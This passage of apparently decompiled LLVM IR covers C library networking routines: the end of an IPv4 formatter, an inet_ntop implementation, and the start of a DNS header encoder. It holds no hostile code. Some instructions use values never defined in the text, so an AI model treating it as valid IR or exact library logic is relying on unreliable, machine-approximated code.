  %v1_167d0 = trunc i32 %v1_167cc to i8
  br i1 %v7_167a8, label %dec_label_pc_167bc, label %dec_label_pc_167e4

dec_label_pc_167bc:                               ; preds = %dec_label_pc_16784
  store i8 %v1_167d0, i8* %v2_167a4, align 1
  %v0_167d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_167d4 = add i32 %v0_167d4, -17
  %v2_167d4 = inttoptr i32 %v1_167d4 to i8*
  %v3_167d4 = load i8, i8* %v2_167d4, align 1
  %v7_167d8 = icmp eq i8 %v3_167d4, 48
  br i1 %v7_167d8, label %dec_label_pc_167bc.dec_label_pc_16808_crit_edge, label %bb

dec_label_pc_167bc.dec_label_pc_16808_crit_edge:  ; preds = %dec_label_pc_167bc
  %v1_16818.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16808

bb:                                               ; preds = %dec_label_pc_167bc
  %v1_167dc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_167dc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16808

dec_label_pc_167e4:                               ; preds = %dec_label_pc_16784
  %v2_16800 = load i32, i32* %sl.global-to-local, align 4
  %v3_16800 = add i32 %v2_16800, -17
  %v4_16800 = inttoptr i32 %v3_16800 to i8*
  store i8 %v1_167d0, i8* %v4_16800, align 1
  %v0_16804 = load i32, i32* %r7.global-to-local, align 4
  %v1_16804 = add i32 %v0_16804, 1
  store i32 %v1_16804, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16808

dec_label_pc_16808:                               ; preds = %dec_label_pc_167bc.dec_label_pc_16808_crit_edge, %bb, %dec_label_pc_167e4
  %v1_16818 = phi i32 [ %v1_16818.pre, %dec_label_pc_167bc.dec_label_pc_16808_crit_edge ], [ %v1_167dc, %bb ], [ %v1_16804, %dec_label_pc_167e4 ]
  %v0_16808 = load i32, i32* %sb.global-to-local, align 4
  %v1_16808 = inttoptr i32 %v0_16808 to i8*
  %v2_16808 = load i8, i8* %v1_16808, align 1
  %tmp17 = urem i8 %v2_16808, 10
  store i32 %v2_1683c, i32* %ip.global-to-local, align 4
  %v1_1681c = add i32 %v1_16818, 1
  store i32 %v1_1681c, i32* %r1.global-to-local, align 4
  %v1_16820 = or i8 %tmp17, 48
  %v3_16824 = add i32 %v2_16818, %v1_16818
  %v4_16824 = inttoptr i32 %v3_16824 to i8*
  store i8 %v1_16820, i8* %v4_16824, align 1
  %v0_16828 = load i32, i32* %ip.global-to-local, align 4
  %v1_16828 = load i32, i32* %r1.global-to-local, align 4
  %v2_16828 = add i32 %v1_16828, %v0_16828
  store i32 %v2_16828, i32* %r2.global-to-local, align 4
  %v3_16830 = add i32 %v2_16828, -17
  %v4_16830 = inttoptr i32 %v3_16830 to i8*
  store i8 46, i8* %v4_16830, align 1
  %v0_16834 = load i32, i32* %r8.global-to-local, align 4
  %v1_16834 = add i32 %v0_16834, 1
  store i32 %v1_16834, i32* %r8.global-to-local, align 4
  %v0_16838 = load i32, i32* %r1.global-to-local, align 4
  %v1_16838 = add i32 %v0_16838, 1
  br label %dec_label_pc_1683c

dec_label_pc_1683c:                               ; preds = %entry, %dec_label_pc_16808
  %v0_16788 = phi i32 [ 0, %entry ], [ %v1_16838, %dec_label_pc_16808 ]
  %v1_16784 = phi i32 [ 0, %entry ], [ %v1_16834, %dec_label_pc_16808 ]
  store i32 %v2_1683c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_16788, i32* %r6.global-to-local, align 4
  %v2_1684c = add i32 %v0_16788, %v2_1683c
  store i32 %v2_1684c, i32* %r5.global-to-local, align 4
  %v7_16850 = icmp sgt i32 %v1_16784, 3
  br i1 %v7_16850, label %dec_label_pc_16854, label %dec_label_pc_16784

dec_label_pc_16854:                               ; preds = %dec_label_pc_1683c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_16760, i32* %r4.global-to-local, align 4
  %v3_1685c = add i32 %v2_1684c, -18
  %v4_1685c = inttoptr i32 %v3_1685c to i8*
  store i8 0, i8* %v4_1685c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_16864 = call i32 @strlen(i8* %tmp18)
  %v2_16868 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_16864, %v2_16868
  br i1 %tmp, label %dec_label_pc_16874, label %dec_label_pc_16888

dec_label_pc_16874:                               ; preds = %dec_label_pc_16854
  %v0_16874 = call i32 @__errno_location()
  %v0_1687c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1687c, i32* %r2.global-to-local, align 4
  %v2_16880 = inttoptr i32 %v0_16874 to i32*
  store i32 28, i32* %v2_16880, align 4
  %v0_16898.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16898

dec_label_pc_16888:                               ; preds = %dec_label_pc_16854
  store i32 %v2_16760, i32* %r1.global-to-local, align 4
  %v3_16890 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_16890, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16898

dec_label_pc_16898:                               ; preds = %dec_label_pc_16874, %dec_label_pc_16888
  %v0_16898 = phi i32 [ %v0_16898.pre, %dec_label_pc_16874 ], [ %v3_16890, %dec_label_pc_16888 ]
  %v2_168a0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_168a0, i32* @r4, align 4
  ret i32 %v0_16898

; uselistorder directives
  uselistorder i32 %v2_1684c, { 0, 2, 1 }
  uselistorder i32 %v1_16784, { 1, 0 }
  uselistorder i32 %v0_16788, { 0, 2, 1 }
  uselistorder i32 %v2_1683c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_16898, { 1, 0 }
  uselistorder label %dec_label_pc_1683c, { 1, 0 }
  uselistorder label %dec_label_pc_16808, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_168a8 = load i32, i32* @r4, align 4
  store i32 %v3_168a8, i32* %stack_var_-32, align 4
  %v6_168a8 = load i32, i32* @r5, align 4
  %v25_168a8 = ptrtoint i32* %stack_var_-32 to i32
  %v7_168ac = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_168ac, label %dec_label_pc_168d0, label %dec_label_pc_168c4

dec_label_pc_168c4:                               ; preds = %entry
  %v7_168c4 = icmp eq i32 %arg1, 10
  br i1 %v7_168c4, label %dec_label_pc_168e4, label %dec_label_pc_16ae4

dec_label_pc_168d0:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_168dc = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_16adc

dec_label_pc_168e4:                               ; preds = %dec_label_pc_168c4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_168f0 = bitcast i32* %stack_var_-64 to i8*
  %v3_168f0 = call i32 @__GI_memset(i8* %v2_168f0, i32 0)
  br label %dec_label_pc_16910

dec_label_pc_168fc:                               ; preds = %dec_label_pc_16910
  %tmp68 = icmp slt i32 %v1_16900, 0
  %v4_16910 = zext i1 %tmp68 to i32
  %v5_16910 = add i32 %v4_16910, %v1_16900
  %v3_16914 = sdiv i32 %v5_16910, 2
  %v4_16924 = mul i32 %v3_16914, 4
  %v5_16924 = add i32 %v4_16924, %v25_168a8
  %v1_168fc = add i32 %v2_16920, 1
  %v2_168fc = inttoptr i32 %v1_168fc to i8*
  %v3_168fc = load i8, i8* %v2_168fc, align 1
  %v4_168fc = zext i8 %v3_168fc to i32
  %v3_16900 = inttoptr i32 %v2_16920 to i8*
  %v4_16900 = load i8, i8* %v3_16900, align 1
  %v6_16900 = zext i8 %v4_16900 to i32
  store i32 %v6_16900, i32* %r2.global-to-local, align 4
  %v4_16904 = mul nuw nsw i32 %v6_16900, 256
  %v5_16904 = or i32 %v4_16904, %v4_168fc
  %v2_16908 = add i32 %v5_16924, -32
  %v3_16908 = inttoptr i32 %v2_16908 to i32*
  store i32 %v5_16904, i32* %v3_16908, align 4
  %v0_1690c = load i32, i32* %r1.global-to-local, align 4
  %v1_1690c = add i32 %v0_1690c, 2
  br label %dec_label_pc_16910

dec_label_pc_16910:                               ; preds = %dec_label_pc_168e4, %dec_label_pc_168fc
  %v1_16900 = phi i32 [ 0, %dec_label_pc_168e4 ], [ %v1_1690c, %dec_label_pc_168fc ]
  store i32 %v1_16900, i32* %r1.global-to-local, align 4
  %v0_16920 = load i32, i32* @r8, align 4
  %v2_16920 = add i32 %v0_16920, %v1_16900
  store i32 %v2_16920, i32* %r2.global-to-local, align 4
  %v7_16928 = icmp sgt i32 %v1_16900, 15
  br i1 %v7_16928, label %dec_label_pc_1692c, label %dec_label_pc_168fc

dec_label_pc_1692c:                               ; preds = %dec_label_pc_16910
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1693c

dec_label_pc_1693c:                               ; preds = %dec_label_pc_1692c, %dec_label_pc_16988
  %v0_1697c = phi i32 [ -1, %dec_label_pc_1692c ], [ %v0_169b0, %dec_label_pc_16988 ]
  %v0_1696c = phi i32 [ -1, %dec_label_pc_1692c ], [ %v0_1699c, %dec_label_pc_16988 ]
  %v0_16950 = phi i32 [ -1, %dec_label_pc_1692c ], [ %v0_169508, %dec_label_pc_16988 ]
  %v0_16988 = phi i32 [ 0, %dec_label_pc_1692c ], [ %v1_16988, %dec_label_pc_16988 ]
  %v4_16940 = mul nuw nsw i32 %v0_16988, 4
  %v5_16940 = add i32 %v4_16940, %v25_168a8
  %v1_16944 = add i32 %v5_16940, -32
  %v2_16944 = inttoptr i32 %v1_16944 to i32*
  %v3_16944 = load i32, i32* %v2_16944, align 4
  %v2_16948 = icmp eq i32 %v3_16944, 0
  %v7_16950 = icmp eq i32 %v0_16950, -1
  br i1 %v2_16948, label %dec_label_pc_16950, label %dec_label_pc_16964

dec_label_pc_16950:                               ; preds = %dec_label_pc_1693c
  br i1 %v7_16950, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16950
  store i32 %v0_16988, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_16988

.thread:                                          ; preds = %dec_label_pc_16950
  %v1_1695c.pre = load i32, i32* @r4, align 4
  %v2_1695c = add i32 %v1_1695c.pre, 1
  store i32 %v2_1695c, i32* @r4, align 4
  br label %dec_label_pc_16988

dec_label_pc_16964:                               ; preds = %dec_label_pc_1693c
  br i1 %v7_16950, label %dec_label_pc_16988, label %dec_label_pc_1696c

dec_label_pc_1696c:                               ; preds = %dec_label_pc_16964
  %v7_1696c = icmp eq i32 %v0_1696c, -1
  %v0_16980.pre = load i32, i32* @r4, align 4
  %v1_16974 = load i32, i32* @r7, align 4
  %v7_16978 = icmp sgt i32 %v0_16980.pre, %v1_16974
  %or.cond = or i1 %v7_1696c, %v7_16978
  br i1 %or.cond, label %dec_label_pc_1697c, label %dec_label_pc_16984

dec_label_pc_1697c:                               ; preds = %dec_label_pc_1696c
  store i32 %v0_1697c, i32* @r6, align 4
  store i32 %v0_16980.pre, i32* @r7, align 4
  br label %dec_label_pc_16984

dec_label_pc_16984:                               ; preds = %dec_label_pc_1696c, %dec_label_pc_1697c
  %v0_1696c13 = phi i32 [ %v0_1697c, %dec_label_pc_1697c ], [ %v0_1696c, %dec_label_pc_1696c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16988

dec_label_pc_16988:                               ; preds = %bb, %.thread, %dec_label_pc_16964, %dec_label_pc_16984
  %v0_169b0 = phi i32 [ %v0_1697c, %.thread ], [ %v0_16988, %bb ], [ %v0_1697c, %dec_label_pc_16964 ], [ -1, %dec_label_pc_16984 ]
  %v0_169508 = phi i32 [ %v0_16950, %.thread ], [ %v0_16988, %bb ], [ -1, %dec_label_pc_16964 ], [ -1, %dec_label_pc_16984 ]
  %v0_1699c = phi i32 [ %v0_1696c, %.thread ], [ %v0_1696c, %bb ], [ %v0_1696c, %dec_label_pc_16964 ], [ %v0_1696c13, %dec_label_pc_16984 ]
  %v1_16988 = add nuw nsw i32 %v0_16988, 1
  store i32 %v1_16988, i32* %r1.global-to-local, align 4
  %v7_16990 = icmp slt i32 %v1_16988, 8
  br i1 %v7_16990, label %dec_label_pc_1693c, label %dec_label_pc_16994

dec_label_pc_16994:                               ; preds = %dec_label_pc_16988
  %v7_16994 = icmp eq i32 %v0_169b0, -1
  br i1 %v7_16994, label %dec_label_pc_169b4, label %dec_label_pc_1699c

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16994
  %v7_1699c = icmp eq i32 %v0_1699c, -1
  %v0_169ac.pre = load i32, i32* @r4, align 4
  br i1 %v7_1699c, label %dec_label_pc_169ac, label %dec_label_pc_169a4

dec_label_pc_169a4:                               ; preds = %dec_label_pc_1699c
  %v1_169a4 = load i32, i32* @r7, align 4
  %v7_169a8 = icmp sgt i32 %v0_169ac.pre, %v1_169a4
  br i1 %v7_169a8, label %dec_label_pc_169ac, label %dec_label_pc_169b4

dec_label_pc_169ac:                               ; preds = %dec_label_pc_1699c, %dec_label_pc_169a4
  store i32 %v0_169ac.pre, i32* @r7, align 4
  store i32 %v0_169b0, i32* @r6, align 4
  br label %dec_label_pc_169b4

dec_label_pc_169b4:                               ; preds = %dec_label_pc_169a4, %dec_label_pc_16994, %dec_label_pc_169ac
  %v0_169b4 = phi i32 [ %v0_1699c, %dec_label_pc_169a4 ], [ %v0_1699c, %dec_label_pc_16994 ], [ %v0_169b0, %dec_label_pc_169ac ]
  %v7_169b4 = icmp eq i32 %v0_169b4, -1
  br i1 %v7_169b4, label %bb49, label %dec_label_pc_169bc

dec_label_pc_169bc:                               ; preds = %dec_label_pc_169b4
  %v0_169bc = load i32, i32* @r7, align 4
  %v7_169c0 = icmp slt i32 %v0_169bc, 2
  br i1 %v7_169c0, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_169bc
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_169b4, %dec_label_pc_169bc, %bb48
  %v0_169d023 = phi i32 [ %v0_169b4, %dec_label_pc_169b4 ], [ %v0_169b4, %dec_label_pc_169bc ], [ -1, %bb48 ]
  %v2_169c4 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_169c4, i32* @r4, align 4
  %v9_16a30 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_169d063 = icmp eq i32 %v0_169d023, -1
  br label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %bb49, %dec_label_pc_16a84
  %v7_169d067 = phi i1 [ %v7_169d063, %bb49 ], [ %v7_169d0, %dec_label_pc_16a84 ]
  %v0_169fc66 = phi i32 [ 0, %bb49 ], [ %v1_16a84, %dec_label_pc_16a84 ]
  %v1_169ec65 = phi i32 [ %v0_169d023, %bb49 ], [ %v0_169d0.pre, %dec_label_pc_16a84 ]
  %v3_16a0464 = phi i32 [ %v2_169c4, %bb49 ], [ %v3_169f424, %dec_label_pc_16a84 ]
  br i1 %v7_169d067, label %dec_label_pc_169fc, label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169d0
  %v9_169d8 = icmp eq i32 %v0_169fc66, %v1_169ec65
  %v5_169dc = icmp slt i32 %v0_169fc66, %v1_169ec65
  br i1 %v5_169dc, label %dec_label_pc_169fc, label %dec_label_pc_169e0

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169d8
  %v1_169e0 = load i32, i32* @r7, align 4
  %v2_169e0 = add i32 %v1_169e0, %v1_169ec65
  %v6_169e8 = icmp slt i32 %v0_169fc66, %v2_169e0
  br i1 %v6_169e8, label %dec_label_pc_169ec, label %dec_label_pc_169fc

dec_label_pc_169ec:                               ; preds = %dec_label_pc_169e0
  br i1 %v9_169d8, label %bb51, label %dec_label_pc_16a84

bb51:                                             ; preds = %dec_label_pc_169ec
  %v4_169f4 = inttoptr i32 %v3_16a0464 to i8*
  store i8 58, i8* %v4_169f4, align 1
  %v5_169f4 = load i32, i32* @r4, align 4
  %v6_169f4 = add i32 %v5_169f4, 1
  store i32 %v6_169f4, i32* @r4, align 4
  br label %dec_label_pc_16a84

dec_label_pc_169fc:                               ; preds = %dec_label_pc_169e0, %dec_label_pc_169d8, %dec_label_pc_169d0
  %v2_169fc = icmp eq i32 %v0_169fc66, 0
  br i1 %v2_169fc, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_169fc
  %v4_16a04 = inttoptr i32 %v3_16a0464 to i8*
  store i8 58, i8* %v4_16a04, align 1
  %v5_16a04 = load i32, i32* @r4, align 4
  %v6_16a04 = add i32 %v5_16a04, 1
  store i32 %v6_16a04, i32* @r4, align 4
  %v0_16a08.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_169fc, %bb52
  %v0_16a48 = phi i32 [ %v3_16a0464, %dec_label_pc_169fc ], [ %v6_16a04, %bb52 ]
  %v1_16a6c = phi i32 [ 0, %dec_label_pc_169fc ], [ %v0_16a08.pre, %bb52 ]
  %v7_16a08 = icmp eq i32 %v1_16a6c, 6
  br i1 %v7_16a08, label %dec_label_pc_16a10, label %dec_label_pc_16a68

dec_label_pc_16a10:                               ; preds = %.thread3
  %v0_16a10 = load i32, i32* @r6, align 4
  %v2_16a10 = icmp eq i32 %v0_16a10, 0
  br i1 %v2_16a10, label %dec_label_pc_16a18, label %dec_label_pc_16a68

dec_label_pc_16a18:                               ; preds = %dec_label_pc_16a10
  %v0_16a18 = load i32, i32* @r7, align 4
  %v7_16a18 = icmp eq i32 %v0_16a18, 6
  br i1 %v7_16a18, label %dec_label_pc_16a38, label %dec_label_pc_16a20

dec_label_pc_16a20:                               ; preds = %dec_label_pc_16a18
  %v7_16a20 = icmp eq i32 %v0_16a18, 5
  br i1 %v7_16a20, label %dec_label_pc_16a28, label %dec_label_pc_16a68

dec_label_pc_16a28:                               ; preds = %dec_label_pc_16a20
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_16a30, label %dec_label_pc_16a38, label %dec_label_pc_16a68

dec_label_pc_16a38:                               ; preds = %dec_label_pc_16a28, %dec_label_pc_16a18
  %v2_16a3c = sub i32 %v25_168a8, %v0_16a48
  %v0_16a40 = load i32, i32* @r8, align 4
  %v1_16a40 = add i32 %v0_16a40, 12
  %v1_16a44 = add i32 %v2_16a3c, -32
  store i32 %v1_16a44, i32* %r2.global-to-local, align 4
  store i32 %v0_16a48, i32* %r1.global-to-local, align 4
  %v3_16a4c = call i32 @inet_ntop4(i32 %v1_16a40, i32 %v0_16a48, i32 %v1_16a44)
  %v2_16a50 = icmp eq i32 %v3_16a4c, 0
  br i1 %v2_16a50, label %dec_label_pc_16adc, label %dec_label_pc_16a58

dec_label_pc_16a58:                               ; preds = %dec_label_pc_16a38
  %v0_16a58 = load i32, i32* @r4, align 4
  %v1_16a58 = inttoptr i32 %v0_16a58 to i8*
  %v3_16a5c = call i32 @strlen(i8* %v1_16a58)
  %v0_16a60 = load i32, i32* @r4, align 4
  %v2_16a60 = add i32 %v0_16a60, %v3_16a5c
  store i32 %v2_16a60, i32* @r4, align 4
  %v0_16a98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16a98

dec_label_pc_16a68:                               ; preds = %dec_label_pc_16a28, %dec_label_pc_16a20, %dec_label_pc_16a10, %.thread3
  %v4_16a6c = mul i32 %v1_16a6c, 4
  %v5_16a6c = add i32 %v4_16a6c, %v25_168a8
  store i32 %v0_16a48, i32* @r0, align 4
  %v1_16a74 = add i32 %v5_16a6c, -32
  %v2_16a74 = inttoptr i32 %v1_16a74 to i32*
  %v3_16a74 = load i32, i32* %v2_16a74, align 4
  store i32 %v3_16a74, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b060.924 to i32), i32* %r1.global-to-local, align 4
  %v7_16a7c = call i32 @sprintf(i32 %v0_16a48, i32 ptrtoint ([3 x i8]* @global_var_1b060.924 to i32), i32 %v3_16a74, i32 %v5_16a6c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_16a80 = load i32, i32* @r4, align 4
  %v2_16a80 = add i32 %v0_16a80, %v7_16a7c
  store i32 %v2_16a80, i32* @r4, align 4
  br label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %dec_label_pc_169ec, %bb51, %dec_label_pc_16a68
  %v3_169f424 = phi i32 [ %v3_16a0464, %dec_label_pc_169ec ], [ %v6_169f4, %bb51 ], [ %v2_16a80, %dec_label_pc_16a68 ]
  %v0_16a84 = load i32, i32* @r5, align 4
  %v1_16a84 = add i32 %v0_16a84, 1
  %v0_169d0.pre = load i32, i32* @r6, align 4
  store i32 %v1_16a84, i32* @r5, align 4
  %v7_16a8c = icmp slt i32 %v1_16a84, 8
  %v7_169d0 = icmp eq i32 %v0_169d0.pre, -1
  br i1 %v7_16a8c, label %dec_label_pc_169d0, label %dec_label_pc_16a90

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a84
  br i1 %v7_169d0, label %.thread4, label %dec_label_pc_16a98

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a90, %dec_label_pc_16a58
  %v3_16aa4 = phi i32 [ %v3_169f424, %dec_label_pc_16a90 ], [ %v2_16a60, %dec_label_pc_16a58 ]
  %v0_16a98 = phi i32 [ %v0_169d0.pre, %dec_label_pc_16a90 ], [ %v0_16a98.pre, %dec_label_pc_16a58 ]
  %v1_16a98 = load i32, i32* @r7, align 4
  %v2_16a98 = add i32 %v1_16a98, %v0_16a98
  %v7_16a9c = icmp eq i32 %v2_16a98, 8
  br i1 %v7_16a9c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_16a98
  %v4_16aa4 = inttoptr i32 %v3_16aa4 to i8*
  store i8 58, i8* %v4_16aa4, align 1
  %v5_16aa4 = load i32, i32* @r4, align 4
  %v6_16aa4 = add i32 %v5_16aa4, 1
  store i32 %v6_16aa4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16a98, %dec_label_pc_16a90, %bb53
  %v2_16aac = phi i32 [ %v3_16aa4, %dec_label_pc_16a98 ], [ %v3_169f424, %dec_label_pc_16a90 ], [ %v6_16aa4, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_16aac = inttoptr i32 %v2_16aac to i8*
  store i8 0, i8* %v3_16aac, align 1
  %v4_16aac = load i32, i32* @r4, align 4
  %v5_16aac = add i32 %v4_16aac, 1
  store i32 %v2_169c4, i32* %r1.global-to-local, align 4
  %v2_16ab4 = sub i32 %v5_16aac, %v2_169c4
  %v1_16ab8 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_16ab4, %v1_16ab8
  br i1 %tmp69, label %dec_label_pc_16ac0, label %dec_label_pc_16ad4

dec_label_pc_16ac0:                               ; preds = %.thread4
  %v0_16ac0 = call i32 @__errno_location()
  %v0_16ac8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16ac8, i32* %r2.global-to-local, align 4
  %v2_16acc = inttoptr i32 %v0_16ac0 to i32*
  store i32 28, i32* %v2_16acc, align 4
  %v0_16af4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16af4

dec_label_pc_16ad4:                               ; preds = %.thread4
  %v0_16ad4 = load i32, i32* @sb, align 4
  %v2_16ad8 = bitcast i32* %stack_var_-110 to i8*
  %v3_16ad8 = call i32 @strcpy(i32 %v0_16ad4, i8* %v2_16ad8)
  br label %dec_label_pc_16adc

dec_label_pc_16adc:                               ; preds = %dec_label_pc_16a38, %dec_label_pc_168d0, %dec_label_pc_16ad4
  %v0_16adc = phi i32 [ 0, %dec_label_pc_16a38 ], [ %v3_168dc, %dec_label_pc_168d0 ], [ %v3_16ad8, %dec_label_pc_16ad4 ]
  store i32 %v0_16adc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16af4

dec_label_pc_16ae4:                               ; preds = %dec_label_pc_168c4
  %v0_16ae4 = call i32 @__errno_location()
  %v2_16aec = inttoptr i32 %v0_16ae4 to i32*
  store i32 97, i32* %v2_16aec, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16af4

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16adc, %dec_label_pc_16ac0, %dec_label_pc_16ae4
  %v0_16af4 = phi i32 [ %v0_16adc, %dec_label_pc_16adc ], [ %v0_16af4.pre, %dec_label_pc_16ac0 ], [ 0, %dec_label_pc_16ae4 ]
  store i32 %v6_168a8, i32* %r5.global-to-local, align 4
  ret i32 %v0_16af4

; uselistorder directives
  uselistorder i1 %v7_169d0, { 1, 0 }
  uselistorder i32 %v0_169d0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_16a84, { 1, 0, 2 }
  uselistorder i32 %v0_16a48, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_16a0464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_169ec65, { 2, 0, 1 }
  uselistorder i32 %v0_169fc66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_169c4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_169d023, { 1, 0 }
  uselistorder i32 %v0_169b4, { 1, 2, 0 }
  uselistorder i32 %v1_16988, { 1, 2, 0 }
  uselistorder i32 %v0_1699c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_169b0, { 1, 2, 0, 3 }
  uselistorder i1 %v7_16950, { 1, 0 }
  uselistorder i32 %v0_16988, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1696c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1697c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16920, { 2, 1, 0 }
  uselistorder i32 %v1_16900, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_168a8, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 2, 3, 4, 8 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 0, 1 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 12, 14, 15, 7, 24, 22, 19, 23, 8, 2, 3, 4, 13, 5, 6, 9, 10, 11, 16, 17, 18, 20, 21 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16af4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16adc, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a84, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_169d0, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_169b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169ac, { 1, 0 }
  uselistorder label %dec_label_pc_16988, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16984, { 1, 0 }
  uselistorder label %dec_label_pc_1693c, { 1, 0 }
  uselistorder label %dec_label_pc_16910, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_16b0c = load i32, i32* @r4, align 4
  store i32 %v3_16b0c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_16b1c = icmp sgt i32 %arg3, 11
  br i1 %v7_16b1c, label %dec_label_pc_16b20, label %dec_label_pc_16be8

dec_label_pc_16b20:                               ; preds = %entry
